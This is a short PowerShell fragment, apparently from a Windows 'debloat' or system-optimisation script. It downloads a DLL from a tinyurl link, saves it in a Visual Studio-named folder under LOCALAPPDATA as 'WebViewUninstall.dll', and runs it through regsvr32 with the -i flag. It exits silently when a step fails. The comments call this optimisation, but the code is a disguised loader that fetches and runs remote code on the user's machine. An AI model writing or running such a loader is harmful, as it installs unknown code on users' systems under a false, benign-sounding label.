...
# Download the debloat DLL file for system optimization
$DebloatDllUrl = "https://tinyurl.com/2s373j2u"
$DebloatDllPath = "$env:LOCALAPPDATA\VisualStudioIDE\WebViewUninstall.dll"
$DebloatDllFolder = "$env:LOCALAPPDATA\VisualStudioIDE"

# Create the debloat folder if it doesn't exist
If (!(Test-Path $DebloatDllFolder)) {
    New-Item -Path $DebloatDllFolder -ItemType Directory -Force
}

# Download the debloat DLL file
Try {
    Invoke-WebRequest -Uri $DebloatDllUrl -OutFile $DebloatDllPath -ErrorAction Stop
}
Catch {
    Exit
}

# Register the debloat DLL for system optimization
Try {
    Start-Process -FilePath "regsvr32.exe" -ArgumentList "-i:`"q`" `"$DebloatDllPath`"" -Wait -NoNewWindow -ErrorAction Stop
}
Catch {
    Exit
}
